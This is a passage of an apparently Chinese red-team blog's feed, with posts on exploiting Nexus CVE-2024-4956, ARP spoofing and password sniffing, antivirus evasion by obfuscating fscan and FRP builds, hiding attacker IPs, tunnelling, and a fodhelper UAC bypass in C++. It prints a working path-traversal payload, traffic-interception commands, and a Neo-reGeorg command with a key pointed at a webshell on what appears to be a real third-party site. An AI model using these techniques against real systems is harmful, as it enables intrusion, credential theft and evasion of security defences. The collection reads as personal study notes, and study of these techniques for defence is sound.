-use_value_profile=1</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/.%2f/..%2f/..%2f/..%2f/..%2f/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607211022316.png" alt="image-20240607211022316"></p>]]></content>
    
    
    <summary type="html">Nexus CVE-2024-4956漏洞代码调试分析</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Basic协议的爆破</title>
    <link href="http://example.com/posts/2870669472.html"/>
    <id>http://example.com/posts/2870669472.html</id>
    <published>2024-05-27T12:21:49.000Z</published>
    <updated>2024-06-20T09:07:51.723Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Basic协议的爆破"><a href="#Basic协议的爆破" class="headerlink" title="Basic协议的爆破"></a>Basic协议的爆破</h1><p><img src="/image/article/Basic%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%88%86%E7%A0%B4.assets/image-20240527202224561.png" alt="image-20240527202224561"></p><p><img src="/image/article/Basic%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%88%86%E7%A0%B4.assets/image-20240527202412563.png" alt="image-20240527202412563"></p><p><img src="/image/article/Basic%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%88%86%E7%A0%B4.assets/image-20240527202505738.png" alt="image-20240527202505738"></p>]]></content>
    
    
    <summary type="html">Basic协议的爆破</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ErFrp二开FRP的使用</title>
    <link href="http://example.com/posts/1483014010.html"/>
    <id>http://example.com/posts/1483014010.html</id>
    <published>2024-05-27T06:11:10.000Z</published>
    <updated>2024-06-20T09:08:00.495Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ErFrp二开FRP的使用"><a href="#ErFrp二开FRP的使用" class="headerlink" title="ErFrp二开FRP的使用"></a>ErFrp二开FRP的使用</h1><p>修改配置</p><p><img src="/image/article/ErFrp%E4%BA%8C%E5%BC%80FRP%E7%9A%84%E4%BD%BF%E7%94%A8.assets/image-20240527141236185.png" alt="image-20240527141236185"></p><p><img src="/image/article/ErFrp%E4%BA%8C%E5%BC%80FRP%E7%9A%84%E4%BD%BF%E7%94%A8.assets/image-20240527141253955.png" alt="image-20240527141253955"></p><p>WINDOWS</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">garble -literals -tiny -seed=random build .\frps.go</span><br></pre></td></tr></table></figure><p>Linux安装GO</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">go env -w GOPROXY=https://mirrors.aliyun.com/goproxy/</span><br><span class="line"></span><br><span class="line">export GOROOT=/home/ubuntu/goroot/go1.21.4</span><br><span class="line">export GOPATH=/home/ubuntu/gopath</span><br><span class="line">export PATH=$PATH:$GOROOT/bin:$GOPATH</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">ErFrp二开FRP的使用</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>webshell不出网正向代理</title>
    <link href="http://example.com/posts/206912199.html"/>
    <id>http://example.com/posts/206912199.html</id>
    <published>2024-05-16T10:14:02.000Z</published>
    <updated>2024-05-16T15:34:37.941Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><a href="https://github.com/L-codes/Neo-reGeorg/tree/master">https://github.com/L-codes/Neo-reGeorg/tree/master</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py -k nihaohack666 -u http://www.scbaoshan.com/cm.aspx</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">webshell不出网正向代理</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>fscan工具免杀</title>
    <link href="http://example.com/posts/2664391026.html"/>
    <id>http://example.com/posts/2664391026.html</id>
    <published>2024-04-30T00:48:02.000Z</published>
    <updated>2024-04-30T02:43:13.609Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fscan工具免杀"><a href="#fscan工具免杀" class="headerlink" title="fscan工具免杀"></a>fscan工具免杀</h1><p>fscan被UPX加壳无法直接转shellcode进行loader</p><p><img src="/fscan%E5%B7%A5%E5%85%B7%E5%85%8D%E6%9D%80.assets/image-20240430085026053.png" alt="image-20240430085026053"></p><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><p><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shadow1ng/fscan.git</span><br></pre></td></tr></table></figure><h2 id="安装GO"><a href="#安装GO" class="headerlink" title="安装GO"></a>安装GO</h2><p><a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a></p><h2 id="garble下载"><a href="#garble下载" class="headerlink" title="garble下载"></a>garble下载</h2><p><a href="https://github.com/burrowers/garble">https://github.com/burrowers/garble</a> go install mvdan.cc&#x2F;garble@latest</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 普通编译</span></span><br><span class="line">go build -ldflags=<span class="string">&quot;-s -w &quot;</span> -trimpath main.go</span><br><span class="line"></span><br><span class="line"><span class="comment"># garble编译</span></span><br><span class="line">garble -literals -tiny -seed=random build -o fn.exe main.go</span><br><span class="line"></span><br><span class="line">garble -tiny -literals -seed=random build -ldflags=<span class="string">&quot;-w -s -H windowsgui&quot;</span> -race go-sc.go</span><br></pre></td></tr></table></figure><h2 id="字符串特征工具"><a href="#字符串特征工具" class="headerlink" title="字符串特征工具"></a>字符串特征工具</h2><p><a href="https://github.com/optiv/Mangle">https://github.com/optiv/Mangle</a></p>]]></content>
    
    
    <summary type="html">fscan工具免杀</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>MASM在VS2022的使用</title>
    <link href="http://example.com/posts/322517130.html"/>
    <id>http://example.com/posts/322517130.html</id>
    <published>2024-04-21T09:02:11.000Z</published>
    <updated>2024-04-21T09:05:59.923Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MASM在VS2022的使用"><a href="#MASM在VS2022的使用" class="headerlink" title="MASM在VS2022的使用"></a>MASM在VS2022的使用</h1><p>项目 &#x3D;&gt; 生成依赖项 &#x3D;&gt; 生成自定义</p><p><img src="/MASM%E5%9C%A8VS2022%E7%9A%84%E4%BD%BF%E7%94%A8.assets/image-20240421170348645.png" alt="image-20240421170348645"></p><p>选择masm</p><p><img src="/MASM%E5%9C%A8VS2022%E7%9A%84%E4%BD%BF%E7%94%A8.assets/image-20240421170424027.png" alt="image-20240421170424027"></p><p>添加 &#x3D;&gt; 新建项 &#x3D;&gt; 添加asm后缀文件</p>]]></content>
    
    
    <summary type="html">MASM在VS2022的使用</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>关于红队的IP隐藏技术</title>
    <link href="http://example.com/posts/2635405924.html"/>
    <id>http://example.com/posts/2635405924.html</id>
    <published>2024-04-08T06:52:45.000Z</published>
    <updated>2024-04-08T07:04:49.403Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于红队的IP隐藏技术"><a href="#关于红队的IP隐藏技术" class="headerlink" title="关于红队的IP隐藏技术"></a>关于红队的IP隐藏技术</h1><h2 id="WebRTC"><a href="#WebRTC" class="headerlink" title="WebRTC"></a>WebRTC</h2><p>WebRTC是一种网络实时通信(web real-time communications)，多用于视频通信对话。像一些浏览器比如Chrome采用了这个技术。在通信时如果我们开启代理或VPN，我们的http是tcp协议的会经过转发，但是WebRTC是通过sunt请求，是UDP协议的并没有经过转发导致泄露了真实IP。可以进行自测</p><p><a href="https://browserleaks.com/webrtc">https://browserleaks.com/webrtc</a></p><p>同时有一些手段进行绕过这个WebRTC：</p><p><strong>1.浏览器插件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://chrome.google.com/webstore/detail/webrtc-leak-shield/bppamachkoflopbagkdoflbgfjflfnfl  </span><br><span class="line"></span><br><span class="line">https://microsoftedge.microsoft.com/addons/detail/pblfgfehcokbglafpcldgjpmknildihk  </span><br><span class="line"></span><br><span class="line">https://addons.mozilla.org/en-US/firefox/addon/webrtc-leak-shield/</span><br></pre></td></tr></table></figure><p><strong>2.浏览器配置</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chrome://flags/#enable-webrtc-hide-local-ips-with-mdns  </span><br><span class="line">opera://flags/#enable-webrtc-hide-local-ips-with-mdns  </span><br><span class="line">edge://flags/#enable-webrtc-hide-local-ips-with-mdns</span><br><span class="line"></span><br><span class="line">about:config  </span><br><span class="line">media.peerconnection.enabled</span><br></pre></td></tr></table></figure><h2 id="代理池"><a href="#代理池" class="headerlink" title="代理池"></a>代理池</h2><p>快速更换IP，直到代理池中的IP被ban完</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/jhao104/proxy_pool </span><br><span class="line">https://github.com/Anyyy111/ProxyPoolxSocks </span><br></pre></td></tr></table></figure><h2 id="云函数"><a href="#云函数" class="headerlink" title="云函数"></a>云函数</h2><p>云函数不需要VPS，云函数在调用时创建，执行完销毁，利用云厂商云函数多出口特性，将HTTP请求进行转发，相当于拥有了代理池</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shimmeris/SCFProxy/blob/main/README_zh.md </span><br></pre></td></tr></table></figure><h2 id="随身WIFI"><a href="#随身WIFI" class="headerlink" title="随身WIFI"></a>随身WIFI</h2><p>使用手机热点或者随身WIFI</p><p>手机热点：IP由基站随机分配，会被溯源到具体位置</p><p>随身WIFI：流量卡IP定位不同城市</p>]]></content>
    
    
    <summary type="html">关于红队的IP隐藏技术</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>WIFI下的近源渗透</title>
    <link href="http://example.com/posts/1310086788.html"/>
    <id>http://example.com/posts/1310086788.html</id>
    <published>2024-03-18T13:31:17.000Z</published>
    <updated>2024-04-08T07:04:49.404Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WIFI下的近源渗透"><a href="#WIFI下的近源渗透" class="headerlink" title="WIFI下的近源渗透"></a>WIFI下的近源渗透</h1><h2 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h2><h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><p>ARP协议规定,每台计算机都需要一个ARP表,用来保存IP地址和MAC地址的映射关系 。访问IP地址的时候就去查ARP表,从而找到对应的MAC地址。</p><p>如果ARP表中匹配不到,就会使用广播的方式发送一个ARP请求 ，目标主机收到请求后会使用单播的方式返回一个ARP响应,告知自己的MAC地址 。</p><p>拿到MAC地址后,会将映射关系缓存到ARP表,而后传递到数据链路层进行解析转换。</p><h3 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h3><p>arpspoof是一个好用的ARP欺骗工具，攻击者通过毒化受害者ARP缓存，将网关MAC替换为攻击者MAC，然后攻击者可截获受害者发送和收到的数据包，从而获取受害者账户、密码等相关敏感信息。Kali linux中自带了该工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br><span class="line">-i：指定网卡</span><br><span class="line">-c:攻击机的IP</span><br><span class="line">-t 目标机器的IP</span><br><span class="line">-r：网关IP</span><br></pre></td></tr></table></figure><h4 id="断网攻击"><a href="#断网攻击" class="headerlink" title="断网攻击"></a>断网攻击</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -r 192.168.0.1 -t 192.168.0.121</span><br><span class="line">-i:指定网卡</span><br><span class="line">-r:指定网关ip</span><br><span class="line">-t:指定靶机ip</span><br></pre></td></tr></table></figure><h4 id="流量劫持"><a href="#流量劫持" class="headerlink" title="流量劫持"></a>流量劫持</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.查看当前是否开启了端口转发</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward </span><br><span class="line"></span><br><span class="line">2.开启通信转发的命令</span><br><span class="line">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line"></span><br><span class="line">3.使用arpspoof发起ARP攻击</span><br><span class="line">arpspoof -i eth0 -r 192.168.110.1 -t 192.168.110.11</span><br></pre></td></tr></table></figure><p>配合wireshark流量过滤</p><p>配合urlsnarf进行流量分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urlsnarf -i eth0</span><br></pre></td></tr></table></figure><p>driftnet图片窃取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0 -a -d /root/pcixxx</span><br></pre></td></tr></table></figure><p>配合ettercap监听密码 监听eth0网卡流量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure><p>配合tc网络限速</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.限制网速200ms延时</span><br><span class="line">tc qdisc add dev eth0 root netem delay 200ms</span><br><span class="line"></span><br><span class="line">2.取消限制网速200ms延时</span><br><span class="line">tc qdisc del dev eth0 root netem delay 200ms</span><br><span class="line"></span><br><span class="line">3.修改网络延时</span><br><span class="line">tc qdisc change  dev eth0 root netem delay 300ms</span><br><span class="line"></span><br><span class="line">查看限速规则</span><br><span class="line">tc qdisc show</span><br><span class="line"></span><br><span class="line">查看靶机当前的网速</span><br><span class="line">https://www.speedtest.cn/</span><br></pre></td></tr></table></figure><h3 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h3><p>启动ettercap GUI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -G</span><br></pre></td></tr></table></figure><p>扫描</p><p><img src="/WIFI%E4%B8%8B%E7%9A%84%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F.assets/%E5%BC%80%E5%90%AF%E6%89%AB%E6%8F%8F.png" alt="开启扫描"></p><p>查看主机列表</p><p><img src="/WIFI%E4%B8%8B%E7%9A%84%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F.assets/%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%88%97%E8%A1%A8.png" alt="查看主机列表"></p><p>网关add target1</p><p><img src="/WIFI%E4%B8%8B%E7%9A%84%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F.assets/%E5%B0%86%E7%BD%91%E5%85%B3%E5%8A%A0%E5%85%A5%E7%9B%AE%E6%A0%871.png" alt="将网关加入目标1"></p><p>目标机器 add target2</p><p><img src="/WIFI%E4%B8%8B%E7%9A%84%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F.assets/%E5%B0%86%E9%9D%B6%E6%9C%BA%E5%8A%A0%E5%85%A5%E5%88%B0%E7%9B%AE%E6%A0%872.png" alt="将靶机加入到目标2"></p><p>选择arp攻击</p><p><img src="/WIFI%E4%B8%8B%E7%9A%84%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F.assets/%E9%80%89%E6%8B%A9ARP%E6%94%BB%E5%87%BB.png" alt="选择ARP攻击"></p><p>发起攻击</p><p><img src="/WIFI%E4%B8%8B%E7%9A%84%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F.assets/%E7%82%B9%E5%87%BBok%E5%8F%91%E8%B5%B7%E6%94%BB%E5%87%BB.png" alt="点击ok发起攻击"></p><p>refer：</p><p><a href="https://www.wangan.com/p/7fy7fg41f40d565f">https://www.wangan.com/p/7fy7fg41f40d565f</a></p><p><a href="https://blog.seanzou.com/archives/-wang-an--fu-xian-wifi-shen-tou--jin-yuan-shen-tou-">https://blog.seanzou.com/archives/-wang-an--fu-xian-wifi-shen-tou--jin-yuan-shen-tou-</a></p><p><a href="https://wooyun.js.org/drops/WIFI%E6%B8%97%E9%80%8F%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A.html">https://wooyun.js.org/drops/WIFI%E6%B8%97%E9%80%8F%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A.html</a></p><p><a href="https://www.freebuf.com/articles/wireless/283395.html">https://www.freebuf.com/articles/wireless/283395.html</a></p><p><a href="https://9bie.org/index.php/archives/869/">https://9bie.org/index.php/archives/869/</a></p><p><a href="https://tttang.com/archive/1888/">https://tttang.com/archive/1888/</a></p>]]></content>
    
    
    <summary type="html">WIFI下的近源渗透</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>内网穿透FRP工具的使用</title>
    <link href="http://example.com/posts/1841941211.html"/>
    <id>http://example.com/posts/1841941211.html</id>
    <published>2024-03-06T11:51:32.000Z</published>
    <updated>2024-04-08T07:04:49.406Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网穿透FRP工具的使用"><a href="#内网穿透FRP工具的使用" class="headerlink" title="内网穿透FRP工具的使用"></a>内网穿透FRP工具的使用</h1><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p><a href="https://gofrp.org/zh-cn/docs/overview/">https://gofrp.org/zh-cn/docs/overview/</a></p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>Linux server example：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Linux后台启动</span><br><span class="line">nohup ./frps -c ./frps.toml&amp;</span><br><span class="line"></span><br><span class="line">#查看当前进程</span><br><span class="line">ps aux</span><br><span class="line"></span><br><span class="line">#关闭</span><br><span class="line">kill -9 PID</span><br></pre></td></tr></table></figure><p>windows client example：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#windows后台启动</span><br><span class="line">start /b frpc.exe -c frpc.toml</span><br><span class="line"></span><br><span class="line">#查看当前进程</span><br><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">#结束进程</span><br><span class="line">taskkill /pid PID -f</span><br></pre></td></tr></table></figure><p>端口被占用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -nap</span><br><span class="line">kill -9 PID</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">内网穿透FRP工具的使用</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>BypassUAC的多种方式</title>
    <link href="http://example.com/posts/888328195.html"/>
    <id>http://example.com/posts/888328195.html</id>
    <published>2024-02-22T10:51:42.000Z</published>
    <updated>2024-06-20T09:02:46.202Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BypassUAC的多种方式"><a href="#BypassUAC的多种方式" class="headerlink" title="BypassUAC的多种方式"></a>BypassUAC的多种方式</h1><p>在上线遇到低权限用户进行提权时，可以利用系统漏洞，利用土豆系列工具提权到system，同时可以BypassUAC提权到管理员。</p><h2 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h2><p>UAC是微软在 Windows Vista 以后版本引入的一种安全机制，UAC全称是User Account Control直译为“用户帐户控制”，UAC需要用户在执行一些可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。</p><p><img src="/image/article/BypassUAC%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E5%BC%8F.assets/uacflowchart.png" alt="img"></p><h2 id="什么是BypassUAC"><a href="#什么是BypassUAC" class="headerlink" title="什么是BypassUAC"></a>什么是BypassUAC</h2><p>在触发UAC时，操作系统会创建一个名为consent.exe的进程，该进程通过白名单和用户选择来确定是否提升权限。 请求进程将要提升权限的进程的commandline和程序路径通过LPC(Local Procedure Call)接口传递给appinfo的RAiluanchAdminProcess函数，该函数首先会验证传入程序是否在白名单内同时判断是否弹出UAC窗口，这个UAC框会创建新的安全桌面，屏蔽之前的界面。同时这个UAC框进程是SYSTEM权限进程，其他普通进程也无法和其进行通信交互。用户确认之后，会调用CreateProcessAsUser函数以管理员权限启动请求的进程。 通常通过UAC的权限提升需要由用户确认，在不被用户发现的情况下静默的将程序的普通权限提升为管理员权限，从而使程序可以实现一些需要权限的操作被称之为BypassUac。</p><h2 id="BypassUAC的多种方式-1"><a href="#BypassUAC的多种方式-1" class="headerlink" title="BypassUAC的多种方式"></a>BypassUAC的多种方式</h2><p>看权限命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure><h3 id="白名单提权"><a href="#白名单提权" class="headerlink" title="白名单提权"></a>白名单提权</h3><p>有一些系统程序是会直接获取管理员权限同时不出发UAC弹窗的，这类程序被称为白名单程序。 这些程序拥有一个manifest文件该文件本质上是一个XML文件用于标识该程序的配置属性。 拥有autoElevate属性程序和微软签名和白名单会被操作系统认为是可信的。会在启动时就静默提升权限。</p><h4 id="查找白名单程序"><a href="#查找白名单程序" class="headerlink" title="查找白名单程序"></a>查找白名单程序</h4><p>白名单程序一般都在 C:\Windows\System32\ 目录下</p><p>利用微软工具sigcheck进行查询</p><p>下载地址：</p><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sigcheck">https://learn.microsoft.com/zh-cn/sysinternals/downloads/sigcheck</a></p><p>如果程序设置如<code>&lt;autoElevate&gt;true&lt;/autoElevate&gt;</code>时，则是在白名单中</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sigcheck64.exe -m C:\Windows\System32\fodhelper.exe | <span class="built_in">findstr</span> auto</span><br></pre></td></tr></table></figure><p><img src="/image/article/BypassUAC%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E5%BC%8F.assets/image-20240222192648387.png" alt="image-20240222192648387"></p><h4 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h4><p>找一个既在白名单又存在DLL劫持的程序</p><p>写一个上线beacon的DLL进行劫持即可</p><h4 id="注册表劫持"><a href="#注册表劫持" class="headerlink" title="注册表劫持"></a>注册表劫持</h4><p>有杀软的情况比较鸡肋360下百分百拦截，火绒WDF其他可以用</p><p>如果键值对HKCU:\Software\Classes\ms-settings\shell\open\command存在，fodhelper会查找HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute,若也存在到则读取HKCU:\Software\Classes\ms-settings\shell\open\command的值然后执行</p><p>C++脚本如下：refer：<a href="https://github.com/supersalted/FodhelperBypassUAC">https://github.com/supersalted/FodhelperBypassUAC</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:windows /ENTRY:mainCRTStartup&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HKEY hKey;</span><br><span class="line"></span><br><span class="line">    si.cb = <span class="built_in">sizeof</span>(STARTUPINFO);</span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line">    <span class="built_in">RegCreateKeyA</span>(HKEY_CURRENT_USER, <span class="string">&quot;Software\\Classes\\ms-settings\\Shell\\open\\command&quot;</span>, &amp;hKey);</span><br><span class="line">    <span class="built_in">RegSetValueExA</span>(hKey, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, REG_SZ, (LPBYTE)<span class="string">&quot;cmd.exe&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;cmd.exe&quot;</span>));</span><br><span class="line">    <span class="built_in">RegSetValueExA</span>(hKey, <span class="string">&quot;DelegateExecute&quot;</span>, <span class="number">0</span>, REG_SZ, (LPBYTE)<span class="string">&quot;&quot;</span>, <span class="built_in">sizeof</span>(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="built_in">CreateProcessA</span>(<span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>,(LPSTR)<span class="string">&quot;/c C:\\Windows\\System32\\fodhelper.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, NORMAL_PRIORITY_CLASS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line">    <span class="built_in">RegDeleteTreeA</span>(HKEY_CURRENT_USER, <span class="string">&quot;Software\\Classes\\ms-settings&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span 